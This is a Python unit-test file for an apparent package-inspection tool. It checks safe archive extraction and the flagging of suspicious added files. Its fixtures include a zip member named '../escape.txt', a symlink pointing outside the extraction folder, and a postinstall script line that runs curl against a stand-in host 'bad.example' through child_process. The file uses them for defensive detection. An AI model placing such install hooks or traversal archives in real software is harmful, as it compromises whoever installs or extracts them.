import io, tarfile, tempfile, unittest, zipfile
from pathlib import Path
from analysis_engine.service import safe_extract, compare_extractions, analyze_differences, InspectionError

class InspectionTests(unittest.TestCase):
    def make_zip(self, path, entries):
        with zipfile.ZipFile(path,"w") as z:
            for name, data in entries.items(): z.writestr(name,data)

    def test_compare_reports_modified_added_deleted_and_identical(self):
        with tempfile.TemporaryDirectory() as td:
            a=Path(td)/"a.zip"; b=Path(td)/"b.zip"
            self.make_zip(a,{"pkg/same.txt":"same","pkg/change.js":"new","pkg/extra.txt":"extra"})
            self.make_zip(b,{"repo/same.txt":"same","repo/change.js":"old","repo/gone.txt":"gone"})
            ea=safe_extract(a,"package"); eb=safe_extract(b,"source")
            result=compare_extractions(ea["extraction_id"],eb["extraction_id"])
            self.assertEqual(result["summary"],{"identical":1,"added":1,"deleted":1,"modified":1})
            self.assertIn("diff",result["modified_files"][0])

    def test_rejects_archive_traversal_member(self):
        with tempfile.TemporaryDirectory() as td:
            archive=Path(td)/"bad.zip"
            self.make_zip(archive,{"../escape.txt":"no","ok.txt":"yes"})
            result=safe_extract(archive,"test")
            extracted=Path(__import__("analysis_engine.service",fromlist=["EXTRACT_DIR"]).EXTRACT_DIR)/result["extraction_id"]
            self.assertFalse((extracted.parent/"escape.txt").exists())
            self.assertEqual(result["file_count"],1)
            self.assertEqual(result["rejected_file_count"],1)
            self.assertEqual(result["rejected_files"][0]["path"], "../escape.txt")

    def test_zip_symbolic_link_is_reported_and_not_extracted(self):
        import stat
        with tempfile.TemporaryDirectory() as td:
            archive=Path(td)/"link.zip"
            with zipfile.ZipFile(archive,"w") as z:
                info=zipfile.ZipInfo("pkg/link")
                info.create_system=3
                info.external_attr=(stat.S_IFLNK | 0o777) << 16
                z.writestr(info,"../../outside")
                z.writestr("pkg/ok.txt","safe")
            result=safe_extract(archive,"test")
            self.assertEqual(result["file_count"],1)
            self.assertEqual(result["rejected_file_count"],1)
            self.assertIn("Symbolic link", result["rejected_files"][0]["reason"])

    def test_added_install_script_is_flagged(self):
        comparison={"modified_files":[],"added_files":["scripts/postinstall.js"],"added_file_details":[
            {"path":"scripts/postinstall.js","text":"require('child_process').exec('curl https://bad.example')"}],
            "deleted_files":[]}
        findings=analyze_differences(comparison)
        self.assertTrue(any("install" in f["title"].lower() for f in findings))
        self.assertTrue(any("Process or shell" in f["title"] for f in findings))

    def test_uncertain_source_match_is_reported_as_incomplete_evidence(self):
        comparison={"modified_files":[],"added_files":[],"added_file_details":[],"deleted_files":[]}
        findings=analyze_differences(comparison, "uncertain")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["file"], "Source discovery")
        self.assertEqual(findings[0]["severity"], "medium")

    def test_character_code_obfuscation_indicator(self):
        comparison={"modified_files":[],"added_files":["src/loader.js"],
            "added_file_details":[{"path":"src/loader.js","text":"const s = String.fromCharCode(72, 73);"}],
            "deleted_files":[]}
        findings=analyze_differences(comparison)
        self.assertTrue(any("Character-code" in f["title"] for f in findings))

if __name__=="__main__": unittest.main()
